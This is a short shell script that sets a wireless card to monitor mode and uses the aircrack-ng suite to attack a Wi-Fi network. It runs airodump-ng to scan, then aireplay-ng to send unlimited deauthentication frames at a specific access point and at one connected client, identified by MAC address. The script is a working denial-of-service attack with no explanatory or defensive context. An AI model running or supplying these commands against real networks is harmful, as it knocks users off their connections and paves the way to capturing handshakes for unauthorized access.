ifconfig wlx6c5ab04a5b20 down
ip link set wlx6c5ab04a5b20 name wlan0
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig
echo [keyfile] >> /etc/NetworkManager/NetworkManager.conf
echo "unmanaged-device=interface-name:wlan0" >> /etc/NetworkManager/NetworkManager.conf
service NetworkManager restart
airodump-ng -c 3 wlan0
aireplay-ng -0 0 -a 04:88:5F:E1:31:B9 wlan0
aireplay-ng -0 0 -a 04:88:5F:E1:31:B9 -c C2:9B:A4:28:9C:17 wlan0
